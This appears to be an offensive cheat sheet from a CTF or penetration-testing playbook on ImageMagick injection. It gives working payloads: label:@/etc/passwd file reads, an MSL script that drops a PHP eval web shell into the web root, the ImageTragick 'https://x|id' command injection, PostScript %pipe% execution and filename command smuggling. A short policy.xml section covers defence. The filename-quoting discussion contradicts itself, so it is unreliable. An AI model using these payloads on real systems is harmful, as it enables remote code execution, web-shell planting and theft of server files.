# ImageMagick Deep — the wrapped-binary injection surface

## The two layers — filename vs content

`convert "$f" out.png` — two distinct injection surfaces:

1. **the filename** — `"$f"` is in a shell command → `x.png;id` is
   `filename-injection.md` (shell-side)
2. **the file content** — ImageMagick's own parser directives → the
   coders below (content-side, no shell needed)

## The coder directives — ImageMagick's little language

Inside an image file (or as an MVG/MSL script), directives execute:

| Directive | Effect |
|---|---|
| `msl:` | MSL script — full control |
| `label:@/file` | label reads a file — exfil channel |
| `ephemeral:`/`info:`/`caption:`/`label:`/`text:` | pseudo-image protocols |
| `@file` | read file as the value |
| `http:`/`https:`/`ftp:` | URL fetch — SSRF |
| `delegate` | external-program delegation |
| `-format '%[...]'` | template-params — `exif:`/`iptc:`/file-read |
| `-set` `-define` `-write` | write/options |

## The classic `label:@/etc/passwd` — file-read primitive

```bash
convert label:@/etc/passwd out.png
convert label:@/flag out.png
```

The label-coder READS `/etc/passwd` INTO the image — if the output is
viewable (an image with the text rendered / an `identify` output) — the
file is exfiltrated through the image text.

## The MSL coder — full script control

```xml
<image>
  <read filename="caption:&lt;?php @eval(@$_REQUEST['x']); ?&gt;" />
  <write filename="/var/www/html/shell.php" />
</image>
```

`msl:` runs the script — `read`/`write`/`print`/`image`/`size`/`profile`
/`get`/`set` — the `write` directive drops arbitrary content to a path —
the `read` directive reads arbitrary paths (or `label:@`/`http:`/`ftp:`).

## CVE chains — the named IM bugs

| CVE | What |
|---|---|
| CVE-2016-3714 "ImageTragick" | `convert` via MSL/`ephemeral:`/`https:` — `url "https://...|id"` — the `|` pipes in the URL-delegate |
| CVE-2016-3715/6/7/8 | related delegate/coder bugs |
| CVE-2020-29599 | PDF password `-authenticate` arg |
| CVE-2022-44268/44269 | `profile` text-chunk leaks a file via PNG metadata |
| CVE-2023-34151 | `-write`/`-define` on restricted policy |

The `|` in `https://url|id` — the URL-delegate's internal shell —
`convert 'https://x|id' out.png` runs `id`.

## The `-format` template-params — the `%[...]` language

`identify -format '%[EXIF:*]'`/`%[file]`/`%[fx:]`/`%[profile:*]` —
the format string evaluates a template — `file:`/`exif:`/`iptc:`/
`profile:`/`signature:`/`label:`/`caption:`/`text:`/`url:` pseudo-coders
inside `%[...]` — `%[url:file:///etc/passwd]`? — some templates read.

## The `delegate.xml` surface — external program delegation

`delegates.xml` maps coders to shell commands —
`command="&quot;curl&quot; -s -k -L -o &quot;%o&quot; &quot;https:%M&quot;"` —
the `%M`/`%o`/`%i`/`%f` are substituted — injecting `%M` content into
the delegate's shell → `&quot;`/`%M` injection — the `|id` in an `https:`
URL goes through the delegate.

## The policy.xml blocks — the defense layer

`/etc/ImageMagick-*/policy.xml` — `<policy domain="coder" rights="none"
pattern="MSL"/>`/`pattern="EPHEMERAL"`/`pattern="URL"`/`pattern="HTTPS"`
— disabled coders → the msl:/url: paths may be closed. Check:

```bash
cat /etc/ImageMagick-*/policy.xml 2>/dev/null
identify -list policy 2>/dev/null
convert -list policy 2>/dev/null
```

If `coder`/`delegate`/`path`/`url`/`ephemeral`/`https`/`http`/`msl`/
`label`/`text`/`ps`/`pdf`/`xps`/`indirect`/`eval`/`image`/`script`/
`resource` rights exist — the path is open.

## The `-write`/`-set`/`-define`/`+profile` flags — arg-injection

`convert x.png -write /tmp/o` — `-write` writes a copy —
`convert x.png -set comment "$(cat /flag)" -write out.png` —
`-set`/`+profile`/`-comment`/`-label`/`-format`/`%[...]` — the flag
lives in metadata. `argument-injection.md` covers the flag list.

## The `id`/`ghostscript`-adjacent — ps/pdf coders

`convert x.ps`/`identify x.pdf` — the PS/PDF coder delegates to `gs` —
`gs` has `%pipe%`/`%os%`/`.libfile`/`-dSAFER`-bypass —
`x.ps` content can carry PostScript that execs:

```postscript
/id (id) def
/id (%pipe%id) def
(r) (w) file /f exch def
```

`%pipe%` is the "pipe through a command" filename — `(%pipe%id)` —
but `-dSAFER`/`-dNOSAFER` decides if it's allowed.

## The filename-injection surface — `"$f"` concat'd

`convert "$f"` — if `f` is user-controlled: `f.png;id` —
`convert "f.png;id"` — the `;` is inside a quoted arg — SAFE? No —
`"$f"` inside `convert "...$f..."` → sh splits on `;` INSIDE quotes? NO —
`"$f"` keeps `;` literal — the `convert` argv gets `f.png;id` — IM's
filename parser may or may not split — but if the dev did
`convert $f` UNQUOTED — `f.png;id` — the `;` splits → `convert f.png`
then `id` — filename-injection.md.

## Falsifiers

- `policy.xml` blocks every coder AND the filename is properly quoted
  AND `+repage`/`--`/`file:` handling closes the arg-position → the
  surface is dead

## Output to record

- which coder/flag/arg carried the injection + the verbatim output
